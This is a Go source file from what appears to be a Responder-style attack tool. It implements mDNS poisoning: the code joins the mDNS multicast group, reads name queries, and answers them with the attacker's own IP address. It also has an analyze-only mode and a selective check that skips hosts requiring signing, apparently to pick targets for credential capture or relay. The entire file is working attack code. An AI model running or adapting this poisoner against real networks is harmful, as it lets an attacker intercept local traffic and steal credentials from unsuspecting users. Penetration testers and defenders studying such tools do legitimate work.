package poisoner

import (
	"net"

	"go-responder/internal/analyzer"
	"go-responder/internal/core"
)

const mdnsMulticast = "224.0.0.251"
const mdnsPort = 5353

func PoisonMDNS(ifaceIP net.IP) {
	iface, err := IfaceByIP(ifaceIP)
	if err != nil {
		core.LogError("mDNS: no interface for %s - %v", ifaceIP, err)
		return
	}
	group := &net.UDPAddr{IP: net.ParseIP(mdnsMulticast), Port: mdnsPort}
	conn, err := net.ListenMulticastUDP("udp4", iface, group)
	if err != nil {
		core.LogError("mDNS: requires root privileges to join multicast - %v", err)
		return
	}
	defer conn.Close()
	core.LogInfo("mDNS  listening on %s (UDP %d, multicast %s)", ifaceIP, mdnsPort, mdnsMulticast)

	buf := make([]byte, 512)
	for {
		n, src, err := conn.ReadFromUDP(buf)
		if err != nil {
			continue
		}
		pkt := buf[:n]
		name := ParseLLMNRQuery(pkt)
		if name == "" {
			continue
		}
		core.LogVerbose("mDNS  query: %s from %s", name, src)
		analyzer.Global.RegisterQuery(src.IP, name)
		if core.AnalyzeMode {
			core.LogInfo("[mDNS] [Analyze] query for '%s' from %s", name, src)
			continue
		}
		if !core.ShouldRespond(src, name) {
			continue
		}
		if !analyzer.Global.ShouldPoison(src.IP) {
			core.LogVerbose("[mDNS] [Selective] skipping %s (signing=required)", src.IP)
			continue
		}
		resp := BuildLLMNRResponse(pkt, ifaceIP)
		if resp != nil {
			conn.WriteTo(resp, src)
			core.LogInfo("[mDNS] Poisoned query for '%s' - responding with %s", name, ifaceIP)
		}
	}
}
